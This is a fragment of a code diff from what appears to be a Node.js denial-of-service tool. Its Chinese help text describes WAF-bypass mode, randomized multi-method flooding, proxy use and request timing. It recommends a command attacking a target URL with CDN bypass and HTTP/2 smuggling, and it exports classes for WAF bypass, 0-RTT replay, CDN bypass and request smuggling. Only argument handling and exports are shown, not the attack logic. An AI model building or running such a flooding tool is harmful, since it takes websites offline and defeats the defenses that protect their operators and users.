-    console.log('  --waf: 启用WAF绕过模式'.warn);
-    console.log('  --random-speed: 启用随机速度和持续时间，同时启用多方法攻击'.warn);
-    console.log('  间隔: 请求间隔时间(毫秒)，默认10ms'.warn);
-    console.log('  连接请求数: 每个连接发送的请求数，默认5'.warn);
-    console.log('  代理文件可选: 如果不提供，将使用直接连接攻击'.warn);
-    process.exit(1);
-  }
-  
-  if (hasArgs) {
-    startEnhancedAttack();
+  if (require.main === module && process.argv.length > 2) startAttack();
+  else if (require.main === module) {
+    console.log('\n用法: node ' + fileName + ' <目标URL> <持续秒> <线程数> [选项]');
+    console.log('\n快捷模式: --mode stealth|aggressive|waffled|full');
+    console.log('推荐命令:');
+    console.log('  node ' + fileName + ' https://target.com 300 10 --mode full --cdn --h2-smuggle --auto-switch --random-speed');
   }
 }
 
-if (require.main === module) {
-  main();
-}
-
-module.exports = {
-  main,
-  startEnhancedAttack,
-  parseArguments,
-  EnhancedWAFBypass,
-  EnhancedRandomSpeedController,
-  RandomDurationGenerator
-};
+if (require.main === module) main();
+module.exports = { startAttack, EnhancedWAFBypass, ZeroRTTReplayEngine, AdvancedCDNBypassEngine, H2SmugglingExecutor };
